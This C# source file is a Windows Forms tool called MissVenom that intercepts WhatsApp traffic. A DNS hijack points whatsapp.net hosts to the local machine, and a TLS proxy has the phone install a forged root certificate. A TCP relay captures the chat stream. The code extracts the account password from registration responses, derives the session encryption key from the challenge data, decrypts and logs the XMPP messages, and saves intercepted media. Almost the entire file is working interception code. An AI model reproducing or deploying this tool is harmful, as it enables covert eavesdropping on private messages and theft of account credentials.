using ARSoft.Tools.Net.Dns;
using HttpServer;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using WhatsAppApi;
using WhatsAppApi.Helper;

namespace MissVenom
{
    public partial class frmMain : Form
    {
        const string WA_SYNC_HOST = "sro.whatsapp.net";
        const string WA_REG_HOST = "v.whatsapp.net";
        const string WA_CERT_HOST = "cert.whatsapp.net";
        const string WA_CHAT_HOST1 = "c.whatsapp.net";
        const string WA_CHAT_HOST2 = "c2.whatsapp.net";
        const string WA_CHAT_HOST3 = "c3.whatsapp.net";

        private static TcpClient s_internal;
        private static TcpClient s_external;

        private string password = string.Empty;
        private static bool enableDNS;
        private static bool enableARP;
        private static bool enableTCP;
        private static bool enableReg;
        private static bool enableMedia;
        private static bool enableSync;

        private TcpListener tcpl;

        private static BinTreeNodeReader reader = new BinTreeNodeReader(WhatsAppApi.Helper.DecodeHelper.getDictionary());

        private string targetIP;

        public static string ResolveHost(string hostname)
        {
            IPHostEntry ips = Dns.GetHostEntry(hostname);
            if (ips != null && ips.AddressList != null && ips.AddressList.Length > 0)
            {
                return ips.AddressList.First().ToString();
            }
            return null;
        }

        private byte[] GetCertificate()
        {
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(GetType(), @"all.whatsapp.net.pfx");
            var bytes = new byte[stream.Length];
            stream.Read(bytes, 0, bytes.Length);
            return bytes;
        }

        private byte[] GetClientCertificate()
        {
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(GetType(), @"server.v2.crt");
            var bytes = new byte[stream.Length];
            stream.Read(bytes, 0, bytes.Length);
            return bytes;
        }

        protected void StartDnsServer()
        {
            try
            {
                DnsServer server = new DnsServer(System.Net.IPAddress.Any, 10, 10, OnDnsQuery);
                this.AddListItem("Started DNS proxy...");
                server.ExceptionThrown += DnsServer_ExceptionThrown;
                server.Start();
            }
            catch (Exception e)
            {
                this.AddListItem(String.Format("ERROR STARTING DNS SERVER: {0}", e.Message));
            }
        }

        private void DnsServer_ExceptionThrown(object sender, ARSoft.Tools.Net.Dns.ExceptionEventArgs e)
        {
            StartDnsServer();
        }

        public frmMain()
        {
            InitializeComponent();
        }

        delegate void AddListItemCallback(String text);
        delegate void AddLogItemCallback(byte[] data, bool toClient);

        private void AddListItem(String data)
        {
            if (this.textBoxOutput.InvokeRequired)
            {
                AddListItemCallback a = new AddListItemCallback(AddListItem);
                this.Invoke(a, new object[] { data });
            }
            else
            {
                this.textBoxOutput.AppendText(String.Format("{0}\r\n", data));
                this.textBoxOutput.DeselectAll();
                //log to file
                try
                {
                    File.AppendAllLines("MissVenom.log", new String[] { data });
                }
                catch (Exception e)
                {

                }
            }
        }

        private void OnHttpsRequest(object sender, RequestEventArgs e)
        {
            String url;
            //dev, for test on localhost:
            if (e.Request.Uri.Authority.EndsWith(".whatsapp.net") && !e.Request.Uri.Authority.Equals(WA_CERT_HOST, StringComparison.InvariantCultureIgnoreCase))
            {
                //use original
                url = e.Request.Uri.AbsoluteUri;
            }
            else
            {
                //return certificate
                byte[] cert = this.GetClientCertificate();
                e.Response.ContentType = new HttpServer.Headers.ContentTypeHeader("application/x-x509-ca-cert");
                e.Response.Add(new HttpServer.Headers.StringHeader("Content-disposition", "attachment; filename=wapi.cer"));
                e.Response.Body.Write(cert, 0, cert.Length);
                return;
            }

            HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;
            try
            {
                request.Method = e.Request.Method;
                if (e.Request.ContentType != null)
                {
                    request.ContentType = e.Request.ContentType.HeaderValue;
                }
                if (e.Request.Headers["User-Agent"] != null)
                {
                    request.UserAgent = e.Request.Headers["User-Agent"].HeaderValue;
                }
                if (e.Request.Headers["Accept"] != null)
                {
                    request.Accept = e.Request.Headers["Accept"].HeaderValue;
                }
                if (e.Request.Headers["Authorization"] != null)
                {
                    request.Headers.Add("Authorization", e.Request.Headers["Authorization"].HeaderValue);
                }
                if (e.Request.Headers["Accept-Encoding"] != null)
                {
                    request.Headers.Add("Accept-Encoding", e.Request.Headers["Accept-Encoding"].HeaderValue);
                }
                if (e.Request.Body.Length > 0)
                {
                    //copy body
                    byte[] req = new byte[e.Request.Body.Length];
                    e.Request.Body.Read(req, 0, (int)e.Request.Body.Length);
                    Stream reqStream = request.GetRequestStream();
                    reqStream.Write(req, 0, req.Length);
                }
            }
            catch (Exception ex)
            {
                this.AddListItem("Warning: " + ex.Message);
            }
            try
            {
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;
                e.Response.ContentType.Value = response.ContentType;
                e.Response.ContentLength.Value = response.ContentLength;
                Stream responseStream = response.GetResponseStream();
                byte[] rawdata = new byte[1024];
                using (MemoryStream ms = new MemoryStream())
                {
                    int read;
                    while ((read = responseStream.Read(rawdata, 0, rawdata.Length)) > 0)
                    {
                        ms.Write(rawdata, 0, read);
                    }
                    rawdata = ms.ToArray();
                }
                if (response.Headers["WWW-Authenticate"] != null)
                {
                    //contact sync auth header
                    e.Response.Add(new HttpServer.Headers.StringHeader("WWW-Authenticate", response.Headers["WWW-Authenticate"].ToString()));
                }
                if(response.Headers["X-WA-Metadata"] != null)
                {
                    //WA media type header
                    e.Response.Add(new HttpServer.Headers.StringHeader("X-WA-Metadata", response.Headers["X-WA-Metadata"]));
                    //save media:
                    string filename = e.Request.Uri.AbsolutePath.Split('/').Last();
                    this.AddListItem(String.Format("Saving media file to {0}", filename));
                    FileStream f = File.OpenWrite(filename);
                    f.Write(rawdata, 0, rawdata.Length);
                    f.Close();
                }

                responseStream.Read(rawdata, 0, rawdata.Length);
                String data = System.Text.Encoding.UTF8.GetString(rawdata);

                //try to find password
                if (e.Request.Uri.Authority == WA_REG_HOST)
                {
                    try
                    {
                        RegResponse reg = JsonConvert.DeserializeObject<RegResponse>(data);
                        if (reg.status == "ok" && !String.IsNullOrEmpty(reg.pw))
                        {
                            this.AddListItem(String.Format("FOUND PASSWORD!: {0}", reg.pw));
                            this.password = reg.pw;
                        }
                    }
                    catch (Exception ex)
                    {
                        this.AddListItem(String.Format("ERROR DESERIALIZING JSON: {0}", ex.Message));
                    }
                }
                e.Response.Body.Write(rawdata, 0, rawdata.Length);

                this.AddListItem(String.Format("USERAGENT:{0}", e.Request.Headers["User-Agent"].HeaderValue));
                this.AddListItem(String.Format("REQUEST:  {0}", e.Request.Uri.AbsoluteUri));
                this.AddListItem(String.Format("RESPONSE: {0}", data));
                this.AddListItem(" ");
            }
            catch (Exception ex)
            {
                this.AddListItem(String.Format("HTTPS REQUEST ERROR: {0}", ex.Message));
            }
        }

        static System.Net.IPAddress GetIP()
        {
            IPHostEntry host;
            System.Net.IPAddress localIP = null;
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (System.Net.IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    localIP = ip;
                }
            }
            return localIP;
        }

        public string[] GetAllIPs()
        {
            List<string> res = new List<string>();
            IPHostEntry host;
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (System.Net.IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    res.Add(ip.ToString());
                }
            }
            return res.ToArray();
        }

        static DnsMessageBase OnDnsQuery(DnsMessageBase message, System.Net.IPAddress clientAddress, ProtocolType protocol)
        {
            message.IsQuery = false;

            DnsMessage query = message as DnsMessage;
            DnsMessage answer = null;

            if ((query != null) && (query.Questions.Count == 1))
            {
                //log
                File.AppendAllLines("VenomDNS.log", new String[] { String.Format("DNS QUERY FROM {0} FOR {1}", clientAddress.ToString(), query.Questions[0].Name) });

                //HOOK:
                //resolve whatsapp.net subdomains
                if (query.Questions[0].RecordType == RecordType.A
                    &&
                    (
                        (query.Questions[0].Name == WA_CERT_HOST)
                        ||
                        (query.Questions[0].Name == WA_REG_HOST && frmMain.enableReg)
                        ||
                        (query.Questions[0].Name == WA_SYNC_HOST && frmMain.enableSync)
                        ||
                        (
                            //media files
                            query.Questions[0].Name.StartsWith("mms")
                            &&
                            query.Questions[0].Name.EndsWith("whatsapp.net")
                            &&
                            frmMain.enableMedia
                        )
                        ||
                        (
                            (
                                query.Questions[0].Name == WA_CHAT_HOST1
                                ||
                                query.Questions[0].Name == WA_CHAT_HOST2
                                ||
                                query.Questions[0].Name == WA_CHAT_HOST3
                            )
                            &&
                            frmMain.enableTCP
                        )
                    )
                    )
                {
                    query.ReturnCode = ReturnCode.NoError;
                    System.Net.IPAddress localIP = GetIP();
                    if (localIP != null)
                    {
                        query.AnswerRecords.Add(new ARecord(query.Questions[0].Name, 30, localIP));
                        return query;
                    }
                }
                // send query to upstream server
                try
                {
                    DnsQuestion question = query.Questions[0];
                    answer = DnsClient.Default.Resolve(question.Name, question.RecordType, question.RecordClass);

                    // if got an answer, copy it to the message sent to the client
                    if (answer != null)
                    {
                        foreach (DnsRecordBase record in (answer.AnswerRecords))
                        {
                            query.AnswerRecords.Add(record);
                        }
                        foreach (DnsRecordBase record in (answer.AdditionalRecords))
                        {
                            query.AnswerRecords.Add(record);
                        }

                        query.ReturnCode = ReturnCode.NoError;
                        return query;
                    }
                }
                catch (Exception e)
                { }
            }
            // Not a valid query or upstream server did not answer correct
            message.ReturnCode = ReturnCode.ServerFailure;
            return message;
        }

        private void StartVenom()
        {
            //do stuff
            this.targetIP = GetIP().ToString();
            if (String.IsNullOrEmpty(this.targetIP))
            {
                this.AddListItem("DNS ERROR: Could not find your local IP address");
                return;
            }

            if (frmMain.enableDNS)
            {
                //start DNS server
                Thread srv = new Thread(new ThreadStart(StartDnsServer));
                srv.IsBackground = true;
                srv.Start();
            }

            //start HTTPS server
            var certificate = new X509Certificate2(this.GetCertificate(), "banana");
            try
            {
                var listener = (SecureHttpListener)HttpServer.HttpListener.Create(System.Net.IPAddress.Any, 443, certificate);
                listener.UseClientCertificate = true;
                listener.RequestReceived += OnHttpsRequest;
                listener.Start(5);
                this.AddListItem("SSL proxy started");
                this.AddListItem("Listening...");
            }
            catch (System.Net.Sockets.SocketException ex)
            {
                this.AddListItem("SOCKET ERROR");
                this.AddListItem("Make sure port 443 is not in use");
                this.AddListItem(ex.Message);
            }
            catch (Exception ex)
            {
                this.AddListItem("GENERAL ERROR");
                this.AddListItem(ex.Message);
            }
            this.AddListItem(" ");

            string[] ips = GetAllIPs();
            if (ips.Length > 1)
            {
                this.AddListItem(String.Format("WARNING: Multiple IP addresses found: {0}", String.Join(" ,", ips)));
            }

            if (frmMain.enableARP)
            {
                //start ARP spoofing
                this.AddListItem("Starting ARP injector (ToDo)\r\n");
            }

            if (frmMain.enableTCP)
            {
                //start TCP proxy
                Thread tcpr = new Thread(new ThreadStart(StartTcpRelay));
                tcpr.IsBackground = true;
                tcpr.Start();
            }

            this.AddListItem(String.Format("Set your DNS address on your phone to {0} (Settings->WiFi->Static IP->DNS) and go to https://cert.whatsapp.net in your phone's browser to install the root certificate", targetIP));
        }

        private void StartTcpRelay()
        {
            this.tcpl = new TcpListener(IPAddress.Any, 5222);
            tcpl.Start();
            this.AddListItem("Started TCP relay, waiting for connection...");

            try
            {
                while (true)
                {
                    s_internal = this.tcpl.AcceptTcpClient();
                    s_internal.ReceiveBufferSize = 1024;
                    byte[] intbuf = new byte[s_internal.ReceiveBufferSize];
                    this.AddListItem("Client connected!");
                    if (s_external != null)
                    {
                        s_external.Close();
                    }
                    s_external = new TcpClient();
                    s_external.Connect("c.whatsapp.net", 5222);
                    s_external.ReceiveBufferSize = 1024;
                    byte[] extbuf = new byte[s_external.ReceiveBufferSize];

                    WhatsAppApi.Helper.Encryption.encryptionIncoming = null;
                    WhatsAppApi.Helper.Encryption.encryptionOutgoing = null;

                    s_internal.GetStream().BeginRead(intbuf, 0, intbuf.Length, OnReceiveIntern, intbuf);
                    s_external.GetStream().BeginRead(extbuf, 0, extbuf.Length, OnReceiveExtern, extbuf);
                }
            }
            catch (Exception e)
            {
                this.AddListItem(String.Format("TCPRELAY STOPPED: {0}", e.Message));
            }
        }

        private void OnReceiveExtern(IAsyncResult result)
        {
            try
            {
                byte[] buffer = result.AsyncState as byte[];
                buffer = TrimBuffer(buffer);
                LogRawData(buffer, "rx");
                try
                {
                    this.DecodeInTree(buffer);
                    s_internal.GetStream().Write(buffer, 0, buffer.Length);
                }
                catch (Exception e)
                {
                    //invalidate buffer and force reauth
                    if (e.Message == "Received encrypted message, encryption key not set" && !String.IsNullOrEmpty(this.password))
                    {
                        this.AddListItem("Invalidated!");
                        buffer = Convert.FromBase64String(this.password);
                    }
                    s_internal.GetStream().Write(buffer, 0, buffer.Length);
                }
                
                buffer = new byte[1024];
                s_external.GetStream().BeginRead(buffer, 0, buffer.Length, OnReceiveExtern, buffer);
            }
            catch (IndexOutOfRangeException e)
            {

            }
            catch (Exception e)
            {
                this.AddListItem(String.Format("TCP EXT ERROR: {0}", e.Message));
            }
        }

        private void OnReceiveIntern(IAsyncResult result)
        {
            try
            {
                byte[] buffer = result.AsyncState as byte[];
                buffer = TrimBuffer(buffer);
                LogRawData(buffer, "tx");
                try
                {
                    if (!(buffer[0] == 'W' && buffer[1] == 'A'))//don't bother decoding WA stream start
                    {
                        this.DecodeOutTree(buffer);
                    }
                    s_external.GetStream().Write(buffer, 0, buffer.Length);
                }
                catch (Exception e)
                {
                    //invalidate buffer and force reauth
                    if (e.Message == "Received encrypted message, encryption key not set" && !String.IsNullOrEmpty(this.password))
                    {
                        this.AddListItem("Invalidated!");
                        buffer = Convert.FromBase64String(this.password);
                    }
                    s_external.GetStream().Write(buffer, 0, buffer.Length);
                }
                
                buffer = new byte[1024];
                s_internal.GetStream().BeginRead(buffer, 0, buffer.Length, OnReceiveIntern, buffer);
            }
            catch (IndexOutOfRangeException e)
            { }
            catch (Exception e)
            {
                this.AddListItem(String.Format("TCP INT ERROR: {0}", e.Message));
            }
        }

        private void DecodeInTree(byte[] data)
        {
            try
            {
                ProtocolTreeNode node = reader.nextTree(data, true);
                
                while (node != null)
                {
                    File.AppendAllLines("xmpp.log", new string[] { node.NodeString("rx") });

                    //look for challengedata and forge key
                    if (node.tag.Equals("challenge", StringComparison.InvariantCultureIgnoreCase) && !String.IsNullOrEmpty(this.password))
                    {
                        this.AddListItem("ChallengeKey received, forging key...");
                        byte[] challengeData = node.GetData();
                        byte[] pass = Convert.FromBase64String(this.password);
                        Rfc2898DeriveBytes r = new Rfc2898DeriveBytes(pass, challengeData, 16);
                        byte[] key = r.GetBytes(20);
                        reader.Encryptionkey = key;
                        //reset static keys
                        WhatsAppApi.Helper.Encryption.encryptionIncoming = null;
                        WhatsAppApi.Helper.Encryption.encryptionOutgoing = null;
                    }

                    node = reader.nextTree(null, true);
                }
            }
            catch (IncompleteMessageException e)
            { }
            catch (Exception e)
            {
                this.AddListItem(String.Format("INDECODER ERROR: {0}", e.Message));
                throw e;
            }
        }

        private void DecodeOutTree(byte[] data)
        {
            try
            {
                ProtocolTreeNode node = reader.nextTree(data, false);
                while (node != null)
                {
                    File.AppendAllLines("xmpp.log", new string[] { node.NodeString("tx") });
                    node = reader.nextTree(null, false);
                }
            }
            catch (IncompleteMessageException e)
            { }
            catch (Exception e)
            {
                this.AddListItem(String.Format("OUTDECODER ERROR: {0}", e.Message));
                throw e;
            }
        }

        private static byte[] TrimBuffer(byte[] buffer)
        {
            //trim null bytes
            int i = buffer.Length - 1;
            while (buffer[i] == 0)
                --i;
            byte[] bar = new byte[i + 1];
            Array.Copy(buffer, bar, i + 1);
            return bar;
        }

        private static void LogRawData(byte[] data, string prefix)
        {
            string dat = Convert.ToBase64String(data);
            File.AppendAllLines("b64raw.log", new string[] { dat });
            //dat = WhatsAppApi.WhatsApp.SYSEncoding.GetString(data);
            //File.AppendAllLines("raw.log", new string[] { dat });
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void EnableDisableControls(bool enableDisable)
        {
            this.textBoxPasswd.Enabled = enableDisable;
            this.checkBoxARP.Enabled = enableDisable;
            this.checkBoxDns.Enabled = enableDisable;
            this.checkBoxMedia.Enabled = enableDisable;
            this.checkBoxReg.Enabled = enableDisable;
            this.checkBoxSync.Enabled = enableDisable;
            this.checkBoxTCP.Enabled = enableDisable;
            this.buttonStart.Enabled = enableDisable;
        }

        private void buttonStart_Click(object sender, EventArgs e)
        {
            //process stuff
            this.buttonStart.Enabled = false;
            if (!String.IsNullOrEmpty(this.textBoxPasswd.Text))
            {
                this.password = this.textBoxPasswd.Text;
            }
            frmMain.enableARP = this.checkBoxARP.Checked;
            frmMain.enableDNS = this.checkBoxDns.Checked;
            frmMain.enableMedia = this.checkBoxMedia.Checked;
            frmMain.enableReg = this.checkBoxReg.Checked;
            frmMain.enableSync = this.checkBoxSync.Checked;
            frmMain.enableTCP = this.checkBoxTCP.Checked;

            //disable stuff
            EnableDisableControls(false);

            //start working
            Thread t = new Thread(new ThreadStart(StartVenom));
            t.IsBackground = true;
            t.Start();
        }
    }
}
